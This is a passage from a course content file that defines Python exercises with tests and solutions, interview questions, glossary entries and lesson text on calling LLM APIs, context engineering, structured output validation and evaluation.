assert cold[1] > hot[1], "lower temperature sharpens the distribution"`,
      solution: `import math

def softmax_t(logits, temperature):
    if temperature == 0:
        best = logits.index(max(logits))
        return [1.0 if i == best else 0.0 for i in range(len(logits))]
    scaled = [x / temperature for x in logits]
    top = max(scaled)
    exps = [math.exp(x - top) for x in scaled]
    total = sum(exps)
    return [e / total for e in exps]`,
    }],
  },
  questions: [
    { id: "q122", topic: "foundations", q: "What is a reasoning model, and when would you not use one?", a: "A model trained (largely with reinforcement learning on checkable tasks) to write out intermediate reasoning before answering; it's much better at multi-step maths, code and planning. Skip it for simple extraction, classification or chat where a fast model passes your evals: thinking tokens cost output prices and add seconds of latency. Control it with a thinking budget or effort level." },
    { id: "q123", topic: "foundations", q: "Why is time to first token different from tokens per second, and what is the KV cache?", a: "Time to first token is mostly prefill: processing the whole prompt, so it grows with prompt length. After that, decode writes one token per step at a steady rate. The KV cache stores the keys and values of tokens already processed so each decode step computes only the new token; it grows with context length and concurrent users, which is what limits serving capacity." },
    { id: "q124", topic: "tokenization", q: "How would you answer questions about a 300-page document with a model?", a: "Count its tokens first. If it fits the context window with room for the answer, send it whole (long documents before the question, prompt caching for repeated questions). If not, or if cost and latency matter, chunk and retrieve the relevant sections (RAG), or summarize sections hierarchically, and measure which approach answers your eval questions best." },
    { id: "q125", topic: "tokenization", q: "Why do code and non-English text cost more tokens?", a: "Tokenizers learn their vocabulary mostly from English prose, so common English words are single tokens while code symbols, rare words and many other languages split into more pieces per character. The same content can cost two or three times as many tokens; always count with the provider's tokenizer." },
    { id: "q126", topic: "sampling", q: "What does temperature do, mathematically?", a: "It divides the logits before softmax. Below 1 it widens the gaps between logits, so the top tokens take more of the probability (more deterministic); above 1 it shrinks the gaps, flattening the distribution (more varied). Temperature 0 is treated as greedy decoding." },
    { id: "q127", topic: "sampling", q: "Top-k versus top-p: what's the difference and when does it matter?", a: "Both cut off unlikely tokens before sampling. Top-k keeps a fixed number of tokens; top-p keeps however many it takes to cover probability p, so it adapts: few tokens when the model is confident, more when it isn't. Usually adjust temperature or top-p, not both, and check the provider's defaults." },
    { id: "q128", topic: "sampling", q: "You set temperature to 0 but still see different outputs. Why?", a: "Providers don't guarantee bit-identical results: floating-point arithmetic on GPUs isn't perfectly repeatable, requests are batched differently, and some architectures route tokens differently under load. Design tests around pass rates and tolerant graders rather than exact matches." },
    { id: "q129", topic: "apis", q: "How do you choose which model to use for a feature?", a: "Define the quality bar with an eval set first. Run the candidates and pick the cheapest, fastest model that passes, considering context window, latency targets, rate limits, data-handling terms and features you need (tool use, structured output, vision). Re-run the evals when models change, and route easy requests to a smaller model if volume is high." },
    { id: "q130", topic: "apis", q: "How does streaming change your error handling?", a: "The status code arrives before the content, so errors can also happen mid-stream: you may have shown half an answer. Handle error events in the stream, decide whether to retry or show a partial answer with a notice, read usage from the final event, and set timeouts for stalls between chunks, not just the overall request." },
  ],
  glossary: [
    ["DPO", "Direct preference optimization: training a model directly on pairs of preferred and rejected answers."],
    ["KV cache", "Stored keys and values of tokens already processed, so each new token needs only its own computation."],
    ["Prefill / decode", "The two phases of generation: processing the whole prompt, then writing one token at a time."],
    ["Reasoning model", "A model trained to write out intermediate reasoning (thinking tokens) before answering; better at multi-step problems, slower and costlier."],
    ["RLHF", "Reinforcement learning from human feedback: a reward model learns human preferences, then the LLM is trained to score well on it."],
    ["SFT", "Supervised fine-tuning: training on example inputs with the desired outputs."],
    ["Top-p (nucleus) sampling", "Sampling only from the smallest set of most likely tokens whose probabilities add up to p."],
  ],
  videos: { foundations: [IBM("o0gkdZBtwEg", "How KV Cache Speeds Up LLMs for Faster AI Models on GPUs")] },
});

// ---------------- Module 3: calling models ----------------
extendTrack(AI, {
  why: {
    apis: "Every AI feature is an API call that can be slow, rate-limited, cut off or expensive. Handling those cases well is most of the first week of an AI engineering job, and the first thing a take-home reviewer checks.",
  },
  exercises: {
    apis: [{
      key: "stream", prompt: "A streamed response arrives as events. Write collect_stream(events) returning (text, stop_reason, input_tokens, output_tokens): input tokens come from the \"message_start\" event's message usage, text from every \"content_block_delta\" whose delta type is \"text_delta\" (joined in order), and the stop reason and output tokens from the \"message_delta\" event. Ignore other event types.",
      example: `events = [{"type": "message_start", "message": {"usage": {"input_tokens": 12}}},\n          {"type": "content_block_delta", "delta": {"type": "text_delta", "text": "Hel"}},\n          {"type": "content_block_delta", "delta": {"type": "text_delta", "text": "lo"}},\n          {"type": "message_delta", "delta": {"stop_reason": "end_turn"}, "usage": {"output_tokens": 2}},\n          {"type": "message_stop"}]\ncollect_stream(events) returns ("Hello", "end_turn", 12, 2)`,
      hint: "Start with `text = \"\"` and the other three as None. Loop over the events and check `e[\"type\"]`; for deltas, also check `e[\"delta\"][\"type\"] == \"text_delta\"` before adding `e[\"delta\"][\"text\"]`.",
      starter: `def collect_stream(events):
    pass
`,
      tests: `events = [{"type": "message_start", "message": {"usage": {"input_tokens": 12}}},
          {"type": "content_block_start", "index": 0},
          {"type": "content_block_delta", "delta": {"type": "text_delta", "text": "Hel"}},
          {"type": "ping"},
          {"type": "content_block_delta", "delta": {"type": "text_delta", "text": "lo"}},
          {"type": "content_block_delta", "delta": {"type": "input_json_delta", "partial_json": "{"}},
          {"type": "message_delta", "delta": {"stop_reason": "max_tokens"}, "usage": {"output_tokens": 2}},
          {"type": "message_stop"}]
assert collect_stream(events) == ("Hello", "max_tokens", 12, 2), collect_stream(events)
assert collect_stream([{"type": "message_start", "message": {"usage": {"input_tokens": 3}}}, {"type": "message_delta", "delta": {"stop_reason": "end_turn"}, "usage": {"output_tokens": 0}}]) == ("", "end_turn", 3, 0)`,
      solution: `def collect_stream(events):
    text = ""
    stop_reason = input_tokens = output_tokens = None
    for e in events:
        if e["type"] == "message_start":
            input_tokens = e["message"]["usage"]["input_tokens"]
        elif e["type"] == "content_block_delta" and e["delta"]["type"] == "text_delta":
            text = text + e["delta"]["text"]
        elif e["type"] == "message_delta":
            stop_reason = e["delta"]["stop_reason"]
            output_tokens = e["usage"]["output_tokens"]
    return text, stop_reason, input_tokens, output_tokens`,
    }, {
      key: "backoff", prompt: "Write backoff_delays(retries, base, cap, retry_after=None) returning the list of waits, in seconds, before each of retries retries: exponential backoff, base × 2 to the power of the retry number (0, 1, 2...), never more than cap. If the server sent a retry-after value, use it for the first wait instead: the server knows best.",
      example: "backoff_delays(4, 1, 5) returns [1, 2, 4, 5]\nbackoff_delays(3, 0.5, 10, retry_after=30) returns [30, 1.0, 2.0]",
      hint: "`[min(cap, base * 2 ** i) for i in range(retries)]`, then replace the first item when `retry_after is not None` and there is at least one retry. (In real code, also multiply each wait by a random factor, called jitter, so many clients don't retry in lockstep.)",
      starter: `def backoff_delays(retries, base, cap, retry_after=None):
    pass
`,
      tests: `assert backoff_delays(4, 1, 5) == [1, 2, 4, 5], backoff_delays(4, 1, 5)
assert backoff_delays(3, 0.5, 10, retry_after=30) == [30, 1.0, 2.0]
assert backoff_delays(0, 1, 5) == []
assert backoff_delays(0, 1, 5, retry_after=9) == [], "no retries, no waits"
assert backoff_delays(2, 2, 100, retry_after=0) == [0, 4], "retry-after 0 is still the server's answer"`,
      solution: `def backoff_delays(retries, base, cap, retry_after=None):
    delays = [min(cap, base * 2 ** i) for i in range(retries)]
    if retry_after is not None and delays:
        delays[0] = retry_after
    return delays`,
    }, {
      key: "pick-model", prompt: "Choosing a model is a trade-off. Write pick_model(models, min_quality, max_latency_ms): models is a list of {\"name\", \"quality\", \"latency_ms\", \"price_per_m\"} dicts, where quality is your eval pass rate. Return the name of the cheapest model with quality at least min_quality and latency at most max_latency_ms (the first one on a price tie), or None if no model qualifies.",
      example: `models = [{"name": "large", "quality": 0.95, "latency_ms": 2400, "price_per_m": 15},\n          {"name": "medium", "quality": 0.91, "latency_ms": 900, "price_per_m": 3},\n          {"name": "small", "quality": 0.82, "latency_ms": 300, "price_per_m": 0.8}]\npick_model(models, 0.9, 1000) returns "medium"`,
      hint: "Filter first: keep the models that meet both limits. If none remain, return None. Otherwise `min(ok, key=lambda m: m[\"price_per_m\"])[\"name\"]` (min keeps the first on ties).",
      starter: `def pick_model(models, min_quality, max_latency_ms):
    pass
`,
      tests: `models = [{"name": "large", "quality": 0.95, "latency_ms": 2400, "price_per_m": 15},
          {"name": "medium", "quality": 0.91, "latency_ms": 900, "price_per_m": 3},
          {"name": "small", "quality": 0.82, "latency_ms": 300, "price_per_m": 0.8},
          {"name": "medium-b", "quality": 0.93, "latency_ms": 800, "price_per_m": 3}]
assert pick_model(models, 0.9, 1000) == "medium", "cheapest that passes; first on a price tie"
assert pick_model(models, 0.8, 500) == "small"
assert pick_model(models, 0.94, 3000) == "large"
assert pick_model(models, 0.99, 5000) is None, "nothing passes the quality bar"`,
      solution: `def pick_model(models, min_quality, max_latency_ms):
    ok = [m for m in models if m["quality"] >= min_quality and m["latency_ms"] <= max_latency_ms]
    if not ok:
        return None
    return min(ok, key=lambda m: m["price_per_m"])["name"]`,
    }, {
      key: "retry-debug", debug: true, prompt: "call_with_retries retries every failure, including 400 and 401 errors that will fail the same way every time: it wastes calls and hides the real error behind 'gave up'. Fix it: return the body on 200; retry only on 429 and 5xx; on any other status raise ValueError naming the status straight away (no retry). If the retryable failures use up max_attempts, raise RuntimeError as before. send() returns (status, body).",
      example: "statuses 503 then 200: returns the body after 2 calls\nstatus 400: raises ValueError after 1 call\nstatus 429 every time: raises RuntimeError after 3 calls",
      hint: "Inside the loop: `if status == 200: return body`; `if status == 429 or 500 <= status <= 599: continue` (try again); otherwise `raise ValueError(\"request failed with status \" + str(status))`.",
      starter: `def call_with_retries(send, max_attempts=3):
    for attempt in range(max_attempts):
        status, body = send()
        if status == 200:
            return body
    raise RuntimeError("gave up after " + str(max_attempts) + " attempts")
`,
      tests: `def make_send(statuses):
    calls = []
    def send():
        status = statuses[min(len(calls), len(statuses) - 1)]
        calls.append(status)
        return status, "ok" if status == 200 else "error"
    return send, calls
send, calls = make_send([503, 200])
assert call_with_retries(send) == "ok" and len(calls) == 2
send, calls = make_send([400])
try:
    call_with_retries(send); raise SystemExit("a 400 must raise ValueError")
except ValueError as e:
    assert "400" in str(e), "name the status"
assert len(calls) == 1, f"a 400 must not be retried; it was sent {len(calls)} times"
send, calls = make_send([429])
try:
    call_with_retries(send); raise SystemExit("expected RuntimeError")
except RuntimeError:
    pass
assert len(calls) == 3`,
      solution: `def call_with_retries(send, max_attempts=3):
    for attempt in range(max_attempts):
        status, body = send()
        if status == 200:
            return body
        if status == 429 or 500 <= status <= 599:
            continue
        raise ValueError("request failed with status " + str(status))
    raise RuntimeError("gave up after " + str(max_attempts) + " attempts")`,
    }],
  },
  glossary: [
    ["Exponential backoff", "Waiting longer after each failed attempt (1s, 2s, 4s...), usually with random jitter, before retrying."],
    ["Streaming", "Receiving a model's output as a series of events while it is generated, instead of all at once at the end."],
  ],
});

// ---------------- Modules 4-6: prompt & context engineering, structured output, evals I ----------------
extendTrack(AI, {
  why: {
    prompting: "Prompts are the code that controls model behaviour. Teams expect you to write them like a spec, keep them in version control, and prove a change helps with an eval instead of a hunch.",
    structured: "Extraction, classification, routing and tool calls all need data your code can trust. Validating model output, and recovering when it's wrong, is one of the most common take-home requirements.",
    evals: "Take-home graders name missing evaluation as the biggest thing that separates candidates, and on the job evals are how you prove that a prompt, model or retrieval change actually helped.",
  },
  append: {
    prompting: `<h3>Context engineering</h3>
      <p>The prompt you write is only part of what the model sees. <b>Context engineering</b> is deciding, for each request, everything that goes into the context window: instructions, examples, retrieved documents, tool definitions and tool results, conversation history and saved memory. It matters more as apps grow, because agents and RAG fill the window with text you didn't write.</p>
      <ul><li><b>Only what this step needs:</b> irrelevant text distracts the model and costs tokens. A 3-paragraph policy beats the 80-page handbook.</li>
      <li><b>Priorities when the budget is tight:</b> decide in advance what is dropped first (old chat turns, then lower-ranked documents) and what is never dropped (the instructions and the question).</li>
      <li><b>Layout:</b> stable parts first (system prompt, tool definitions, reference documents), then the changing parts, with the question last. Long documents go before the question, each in its own labelled tag. A stable prefix also keeps prompt caching working.</li>
      <li><b>System prompt vs user turn:</b> durable rules (role, tone, constraints, output format) in the system prompt; the task and its data in the user turn.</li></ul>
      <h3>Debugging a prompt</h3>
      <p>When output is wrong, read the <b>fully rendered prompt</b> that was actually sent, not the template. The usual causes: missing context, instructions that conflict, data mixed in with instructions without tags, examples that are all alike (the model copies their quirks), and an output format that was never specified.</p>`,
    structured: `<h3>Retrying with the error</h3>
      <p>When validation fails, don't just ask again: send the model its bad output together with the exact validation error ("salary_min: expected integer, got '90k'") and ask for corrected JSON. Cap the attempts (2 or 3), then fall back or flag for a human, and log every failure: those are tomorrow's eval cases.</p>
      <h3>Business rules beyond the schema</h3>
      <p>A schema checks shape. Your code still checks meaning: values from an allowed list (an <b>enum</b>), numbers in range, dates that parse, fields that agree with each other (salary_min no bigger than salary_max), IDs that exist in your database. Watch types too: models often return numbers as text, and text comparison gets them wrong.</p>`,
    evals: `<h3>Error analysis: look before you measure</h3>
      <p>Before choosing metrics, read real outputs. The method most eval teams use:</p>
      <ol><li>Run the feature on 30-100 realistic inputs and read every output.</li>
      <li>For each bad one, write a short note on what went wrong ("invented a skill", "salary in wrong currency"). This is sometimes called open coding.</li>
      <li>Group the notes into a handful of <b>failure categories</b> and count them.</li>
      <li>Fix the biggest category first, and add a grader that catches it so it can't come back.</li></ol>
      <p>Prefer <b>binary pass/fail checks per criterion</b> ("cites a source: yes/no") over 1-10 scores: they're easier to agree on, to automate and to act on. Build the golden set <b>before or alongside</b> the feature, not after: it's how you'll know when you're done. LLM judges, CI gates and A/B tests come later, in <button class="link-btn inline-link" data-trgo="ai|learn|evalsci">Evals in production</button>.</p>`,
  },
  exercises: {
    prompting: [{
      key: "pack-context", prompt: "Write pack_context(pieces, budget). Each piece is {\"name\", \"tokens\", \"priority\"} (a lower number is more important). Take pieces in priority order (pieces with the same priority keep their list order) and include each one that still fits in the budget, skipping any that don't. Return the names of the included pieces in their original list order, so the prompt keeps its layout.",
      example: `pieces = [{"name": "system", "tokens": 300, "priority": 0},\n          {"name": "old_turns", "tokens": 900, "priority": 3},\n          {"name": "doc_1", "tokens": 600, "priority": 1},\n          {"name": "question", "tokens": 50, "priority": 0}]\npack_context(pieces, 1000) returns ["system", "doc_1", "question"]`,
      hint: "`sorted(pieces, key=lambda p: p[\"priority\"])` is stable, so ties keep their order. Track `used`, and add a piece's name to a set when `used + p[\"tokens\"] <= budget`. Finally `[p[\"name\"] for p in pieces if p[\"name\"] in chosen]` restores the original order.",
      starter: `def pack_context(pieces, budget):
    pass
`,
      tests: `pieces = [{"name": "system", "tokens": 300, "priority": 0},
          {"name": "old_turns", "tokens": 900, "priority": 3},
          {"name": "doc_1", "tokens": 600, "priority": 1},
          {"name": "doc_2", "tokens": 200, "priority": 2},
          {"name": "question", "tokens": 50, "priority": 0}]
assert pack_context(pieces, 1000) == ["system", "doc_1", "question"], pack_context(pieces, 1000)
assert pack_context(pieces, 1150) == ["system", "doc_1", "doc_2", "question"], "a lower-priority piece still goes in if it fits"
assert pack_context(pieces, 349) == ["system"], "skip what doesn't fit, keep going"
assert pack_context(pieces, 10_000) == ["system", "old_turns", "doc_1", "doc_2", "question"]`,
      solution: `def pack_context(pieces, budget):
    used = 0
    chosen = set()
    for p in sorted(pieces, key=lambda p: p["priority"]):
        if used + p["tokens"] <= budget:
            chosen.add(p["name"])
            used = used + p["tokens"]
    return [p["name"] for p in pieces if p["name"] in chosen]`,
    }, {
      key: "shots-as-turns", prompt: "Few-shot examples work well as earlier turns of the conversation. Write build_request(rules, examples, question) returning {\"system\": rules, \"messages\": [...]}, where each (input, output) example becomes a user message followed by an assistant message, and the question is the final user message.",
      example: `build_request("Classify sentiment.", [("Great!", "positive")], "Meh.") returns\n{"system": "Classify sentiment.", "messages": [\n  {"role": "user", "content": "Great!"}, {"role": "assistant", "content": "positive"},\n  {"role": "user", "content": "Meh."}]}`,
      hint: "Start `messages = []`; for each `inp, out` append two dicts; then append the question; return the dict.",
      starter: `def build_request(rules, examples, question):
    pass
`,
      tests: `r = build_request("Classify sentiment.", [("Great!", "positive"), ("Awful.", "negative")], "Meh.")
assert r["system"] == "Classify sentiment."
assert [m["role"] for m in r["messages"]] == ["user", "assistant", "user", "assistant", "user"]
assert r["messages"][1] == {"role": "assistant", "content": "positive"}
assert r["messages"][-1] == {"role": "user", "content": "Meh."}
assert build_request("x", [], "q")["messages"] == [{"role": "user", "content": "q"}]`,
      solution: `def build_request(rules, examples, question):
    messages = []
    for inp, out in examples:
        messages.append({"role": "user", "content": inp})
        messages.append({"role": "assistant", "content": out})
    messages.append({"role": "user", "content": question})
    return {"system": rules, "messages": messages}`,
    }, {
      key: "prompt-order", debug: true, prompt: "The answers from this document Q&A prompt are poor, and on long documents the model seems to ignore the end of the document. Reading the rendered prompt shows two bugs: the question comes before the long document, and the document tag is never closed, so the instruction looks like part of the document. Fix build_prompt: the closed document block first, then the question, then the instruction.",
      example: `build_prompt("Leave: 15 days.", "How many days?") returns\n<document>\nLeave: 15 days.\n</document>\n<question>How many days?</question>\nAnswer using only the document. If it doesn't contain the answer, say so.`,
      hint: "Put the pieces in the order document, question, instruction, and add the missing `\"</document>\"` after the document text.",
      starter: `NL = chr(10)

def build_prompt(document, question):
    return ("<question>" + question + "</question>" + NL
            + "<document>" + NL + document + NL
            + "Answer using only the document. If it doesn't contain the answer, say so.")
`,
      tests: `p = build_prompt("Leave: 15 days.", "How many days?")
assert p.count("<document>") == 1 and p.count("</document>") == 1, "close the document tag"
assert p.index("</document>") < p.index("<question>"), "long documents go before the question"
assert p.index("</document>") < p.index("Answer using only the document"), "the instruction must sit outside the document"
assert p.index("</question>") < p.index("Answer using only"), "question, then instruction"
assert "Leave: 15 days." in p and "How many days?" in p`,
      solution: `NL = chr(10)

def build_prompt(document, question):
    return ("<document>" + NL + document + NL + "</document>" + NL
            + "<question>" + question + "</question>" + NL
            + "Answer using only the document. If it doesn't contain the answer, say so.")`,
    }],
    structured: [{
      key: "validate", prompt: "Write validate(data, schema) for a small part of JSON Schema. schema has \"required\" (a list of keys) and \"properties\" (key to rules). Rules can have \"type\" (\"string\", \"integer\", \"number\", \"boolean\"), \"enum\" (allowed values), \"minimum\" and \"maximum\". Return a list of error strings: first \"missing: KEY\" for each missing required key, then for each property present in data, in schema order, the first problem found: \"KEY: expected TYPE\", \"KEY: not one of A, B\", \"KEY: below minimum N\" or \"KEY: above maximum N\".",
      example: `schema = {"required": ["title", "work_mode"],\n          "properties": {"title": {"type": "string"},\n                         "work_mode": {"type": "string", "enum": ["remote", "hybrid", "onsite"]},\n                         "salary_min": {"type": "integer", "minimum": 0}}}\nvalidate({"title": "Dev", "salary_min": -5}, schema) returns\n["missing: work_mode", "salary_min: below minimum 0"]`,
      hint: "Map type names to checks with type(): string is `type(v) is str`, integer `type(v) is int`, number `type(v) in (int, float)`, boolean `type(v) is bool`. (isinstance would let True count as an integer, because bool is a kind of int.) Use `\", \".join(str(x) for x in rules[\"enum\"])` for the enum message, and stop checking a property after its first error.",
      starter: `def validate(data, schema):
    pass
`,
      tests: `schema = {"required": ["title", "work_mode"],
          "properties": {"title": {"type": "string"},
                         "work_mode": {"type": "string", "enum": ["remote", "hybrid", "onsite"]},
                         "salary_min": {"type": "integer", "minimum": 0, "maximum": 1000000},
                         "remote_ok": {"type": "boolean"},
                         "score": {"type": "number"}}}
assert validate({"title": "Dev", "work_mode": "hybrid"}, schema) == []
assert validate({"title": "Dev", "salary_min": -5}, schema) == ["missing: work_mode", "salary_min: below minimum 0"], validate({"title": "Dev", "salary_min": -5}, schema)
assert validate({"title": 7, "work_mode": "office"}, schema) == ["title: expected string", "work_mode: not one of remote, hybrid, onsite"]
assert validate({"title": "a", "work_mode": "remote", "salary_min": "90k"}, schema) == ["salary_min: expected integer"]
assert validate({"title": "a", "work_mode": "remote", "salary_min": True}, schema) == ["salary_min: expected integer"], "True is not an integer here"
assert validate({"title": "a", "work_mode": "remote", "salary_min": 2000000}, schema) == ["salary_min: above maximum 1000000"]
assert validate({"title": "a", "work_mode": "remote", "score": 4.5, "remote_ok": 1}, schema) == ["remote_ok: expected boolean"]
assert validate({}, {"required": ["a", "b"], "properties": {}}) == ["missing: a", "missing: b"]`,
      solution: `CHECKS = {
    "string": lambda v: type(v) is str,
    "integer": lambda v: type(v) is int,
    "number": lambda v: type(v) in (int, float),
    "boolean": lambda v: type(v) is bool,
}

def validate(data, schema):
    errors = ["missing: " + k for k in schema["required"] if k not in data]
    for key, rules in schema["properties"].items():
        if key not in data:
            continue
        v = data[key]
        if "type" in rules and not CHECKS[rules["type"]](v):
            errors.append(key + ": expected " + rules["type"])
        elif "enum" in rules and v not in rules["enum"]:
            errors.append(key + ": not one of " + ", ".join(str(x) for x in rules["enum"]))
        elif "minimum" in rules and v < rules["minimum"]:
            errors.append(key + ": below minimum " + str(rules["minimum"]))
        elif "maximum" in rules and v > rules["maximum"]:
            errors.append(key + ": above maximum " + str(rules["maximum"]))
    return errors`,
    }, {
      key: "retry-json", prompt: "Write extract_with_retry(ask, required, max_attempts=3). ask(feedback) returns the model's reply text; the first call passes None. Parse the reply with json.loads and check every key in required is present. If either check fails, call ask again with feedback: a string describing the problem (the JSON error message, or \"missing key: NAME\"). Return the parsed dict as soon as one passes; raise ValueError after max_attempts failed replies.",
      example: `First reply "{name: Ada}" (not JSON), second '{"name": "Ada"}':\nextract_with_retry(ask, ["name"]) returns {"name": "Ada"}, and the second call to ask received the JSON error as feedback`,
      hint: "Loop `for attempt in range(max_attempts):`, call `ask(feedback)`, and inside `try:` do `json.loads(...)`; on `except ValueError as e:` set `feedback = \"invalid JSON: \" + str(e)` and `continue`. Then look for a missing key the same way. Raise after the loop.",
      starter: `import json

def extract_with_retry(ask, required, max_attempts=3):
    pass
`,
      tests: `def scripted(replies):
    seen = []
    def ask(feedback):
        seen.append(feedback)
        return replies[len(seen) - 1]
    return ask, seen
ask, seen = scripted(["{name: Ada}", '{"name": "Ada"}'])
assert extract_with_retry(ask, ["name"]) == {"name": "Ada"}
assert seen[0] is None and isinstance(seen[1], str) and seen[1], "send the error back on the retry"
ask, seen = scripted(['{"title": "Dev"}', '{"title": "Dev", "company": "Clio"}'])
assert extract_with_retry(ask, ["title", "company"]) == {"title": "Dev", "company": "Clio"}
assert "company" in seen[1], "the feedback should name the missing key"
ask, seen = scripted(["nope", "nope", "nope", '{"a": 1}'])
try:
    extract_with_retry(ask, ["a"]); raise SystemExit("expected ValueError after 3 bad replies")
except ValueError:
    pass
assert len(seen) == 3, "stop after max_attempts"`,
      solution: `import json

def extract_with_retry(ask, required, max_attempts=3):
    feedback = None
    for attempt in range(max_attempts):
        text = ask(feedback)
        try:
            data = json.loads(text)
        except ValueError as e:
            feedback = "invalid JSON: " + str(e)
            continue
        missing = [k for k in required if k not in data]
        if missing:
            feedback = "missing key: " + missing[0]
            continue
        return data
    raise ValueError("no valid reply after " + str(max_attempts) + " attempts: " + feedback)`,
    }, {
      key: "salary-debug", debug: true, prompt: "The model returns salaries as text, like \"90000\" or \"$95,000\". salary_ok is supposed to reject postings where salary_min is bigger than salary_max, but it rejects \"90000\" to \"100000\" and accepts \"$95,000\" to \"$90,000\". Fix it so it compares the amounts as numbers (values may also already be numbers).",
      example: `salary_ok({"salary_min": "90000", "salary_max": "100000"}) returns True\nsalary_ok({"salary_min": "$95,000", "salary_max": "$90,000"}) returns False`,
      hint: "Text compares character by character: \"9\" comes after \"1\", so \"90000\" > \"100000\". Write a helper that turns a value into an int: `int(str(v).replace(\"$\", \"\").replace(\",\", \"\"))`, and compare those.",
      starter: `def salary_ok(job):
    return job["salary_min"] <= job["salary_max"]
`,
      tests: `assert salary_ok({"salary_min": "90000", "salary_max": "100000"}) is True, "compare as numbers, not text"
assert salary_ok({"salary_min": "$95,000", "salary_max": "$90,000"}) is False
assert salary_ok({"salary_min": 80000, "salary_max": "$80,000"}) is True, "mixed numbers and text"
assert salary_ok({"salary_min": "120,000", "salary_max": "95000"}) is False`,
      solution: `def amount(v):
    return int(str(v).replace("$", "").replace(",", ""))

def salary_ok(job):
    return amount(job["salary_min"]) <= amount(job["salary_max"])`,
    }],
    evals: [{
      key: "tally", prompt: "Error analysis ends with counting. Write failure_tally(notes): notes is a list of (case_id, category) pairs where category is None for a case that passed. Return a list of (category, count) pairs for the failures, most common first; categories with the same count are in alphabetical order.",
      example: `failure_tally([("c1", "invented skill"), ("c2", None), ("c3", "wrong currency"), ("c4", "invented skill")])\nreturns [("invented skill", 2), ("wrong currency", 1)]`,
      hint: "Count with a dict, skipping None. Then `sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))`: the minus sign sorts counts biggest first, and the name breaks ties alphabetically.",
      starter: `def failure_tally(notes):
    pass
`,
      tests: `notes = [("c1", "invented skill"), ("c2", None), ("c3", "wrong currency"), ("c4", "invented skill"), ("c5", "missed remote"), ("c6", "missed remote"), ("c7", None)]
assert failure_tally(notes) == [("invented skill", 2), ("missed remote", 2), ("wrong currency", 1)], failure_tally(notes)
assert failure_tally([("c1", None)]) == []
assert failure_tally([]) == []`,
      solution: `def failure_tally(notes):
    counts = {}
    for case_id, category in notes:
        if category is not None:
            counts[category] = counts.get(category, 0) + 1
    return sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))`,
    }, {
      key: "criteria", prompt: "Grade with binary checks per criterion. Write pass_rates(results): results is a list of dicts, one per case, mapping each criterion name to True (pass) or False. Return a dict mapping each criterion to its pass rate across the cases that include it, in the order criteria first appear.",
      example: `pass_rates([{"cites_source": True, "on_topic": True},\n            {"cites_source": False, "on_topic": True}])\nreturns {"cites_source": 0.5, "on_topic": 1.0}`,
      hint: "Keep two dicts, passed and seen. For each case and each `name, ok in case.items()`, add 1 to seen[name] and, if ok, to passed[name]. Then divide.",
      starter: `def pass_rates(results):
    pass
`,
      tests: `results = [{"cites_source": True, "on_topic": True, "valid_json": True},
           {"cites_source": False, "on_topic": True},
           {"cites_source": True, "on_topic": False, "valid_json": False},
           {"cites_source": False, "on_topic": True}]
r = pass_rates(results)
assert list(r) == ["cites_source", "on_topic", "valid_json"]
assert r == {"cites_source": 0.5, "on_topic": 0.75, "valid_json": 0.5}, r
assert pass_rates([]) == {}`,
      solution: `def pass_rates(results):
    passed = {}
    seen = {}
    for case in results:
        for name, ok in case.items():
            seen[name] = seen.get(name, 0) + 1
            passed[name] = passed.get(name, 0) + (1 if ok else 0)
    return {name: passed[name] / seen[name] for name in seen}`,
    }, {
      key: "grader-debug", debug: true, prompt: "The eval dashboard shows a 100% pass rate on a maths set, but users report wrong answers. The grader is too loose: it passes \"The answer is 14\" when the expected answer is \"4\". It's also too strict: it fails \"It's Ottawa!\" against \"ottawa\". Fix grade so it passes only when the expected answer appears as a whole word, ignoring case and punctuation around words.",
      example: `grade("The answer is 14.", "4") returns False\ngrade("The answer is 4.", "4") returns True\ngrade("It's Ottawa!", "ottawa") returns True`,
      hint: "Split the output into words, strip punctuation from the ends of each with `w.strip(\".,!?;:\")`, lowercase them, and check whether `expected.lower()` is in that list.",
      starter: `def grade(output, expected):
    return expected in output
`,
      tests: `assert grade("The answer is 14.", "4") is False, "4 inside 14 must not count"
assert grade("The answer is 4.", "4") is True
assert grade("It's Ottawa!", "ottawa") is True, "ignore case and punctuation"
assert grade("Ottawan food is great", "ottawa") is False
assert grade("", "4") is False`,
      solution: `def grade(output, expected):
    words = [w.strip(".,!?;:").lower() for w in output.split()]
    return expected.lower() in words`,
    }],
  },
  questions: [
    { id: "q131", topic: "prompting", q: "What is context engineering, and how is it different from prompt engineering?", a: "Prompt engineering is writing the instructions; context engineering is deciding everything that goes into the window for each request: instructions, examples, retrieved documents, tool definitions and results, history and memory. It means budgeting tokens by priority, including only what the step needs, laying out stable parts first for caching, and compacting or dropping history. Agents and RAG make it the bigger problem." },
    { id: "q132", topic: "prompting", q: "A prompt works in your tests but fails for some real users. How do you debug it?", a: "Collect the failing requests and read the fully rendered prompts, not the template: often a missing variable, an unexpected input shape, a long document pushing instructions out of focus, or user text that looks like instructions. Categorize the failures, add them to the eval set, change one thing at a time and re-run the whole set to make sure nothing else regresses." },
    { id: "q133", topic: "structured", q: "Your extraction returns valid JSON with wrong values. How do you catch and handle it?", a: "Validate beyond the schema: enums, ranges, cross-field rules, IDs that exist, and types (numbers returned as text). On failure retry once or twice with the specific error, then fall back or send to human review. Log every failure, categorize them in error analysis, and fix the biggest category in the prompt, schema descriptions or examples, measured on a golden set." },
    { id: "q134", topic: "structured", q: "When would you get JSON through a tool definition rather than a structured-output schema?", a: "Use a structured-output schema when every response must be one shape, like extraction. Use tools when the model should decide whether and which action to take, or produce several different structured actions in one conversation. Both use JSON Schema; both still need validation in your code." },
    { id: "q135", topic: "evals", q: "How do you do error analysis on an LLM feature?", a: "Run it on realistic inputs, read every output, write a short note on each failure, then group the notes into a few failure categories and count them. Fix the largest category first and add a grader for it. It tells you which metrics matter, instead of guessing them up front." },
    { id: "q136", topic: "evals", q: "Why prefer binary pass/fail criteria over 1-10 quality scores?", a: "Binary checks per criterion (cites a source, valid JSON, no invented facts) are easier for people and judges to agree on, easier to automate, and point at what to fix. Scales drift between graders, hide which aspect failed, and make small changes hard to interpret." },
  ],
  quiz: [
    { id: "x102", tags: [], topic: "evals", q: "The first step of error analysis on a new LLM feature is to:", options: ["Pick a benchmark", "Read real outputs and note what went wrong in each failure", "Train a judge model", "Tune the temperature"], answer: 1, why: "Categories and metrics come from reading actual failures, not from guessing them in advance." },
